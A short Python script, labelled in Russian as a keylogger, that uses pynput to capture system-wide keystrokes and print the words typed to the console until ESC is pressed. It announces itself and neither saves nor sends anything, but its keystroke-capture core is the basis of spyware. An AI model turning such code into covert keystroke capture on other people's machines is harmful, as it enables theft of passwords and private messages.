from pynput import keyboard
curr_wor=""

def on_press(key):
    global curr_wor

    try:
        if hasattr(key, 'char') and key.char is not None:
             curr_wor+=key.char
        elif key==keyboard.Key.space:
            if curr_wor:
                print("\n",">>>",curr_wor)
                curr_wor=""
        elif key==keyboard.Key.enter:
            if curr_wor:
                print("\n",">>>",curr_wor)
                curr_wor = ""
            print()
        elif key==keyboard.Key.esc:
            print("\nВыход....")
            return False
        elif key==keyboard.Key.backspace:
            curr_wor=curr_wor[:-1]
    except Exception as e:
        print(f"Ошибка : {e}")

print("Keylogger запущен")
print("ESC - exit")

with keyboard.Listener(on_press=on_press) as lst:
    lst.join()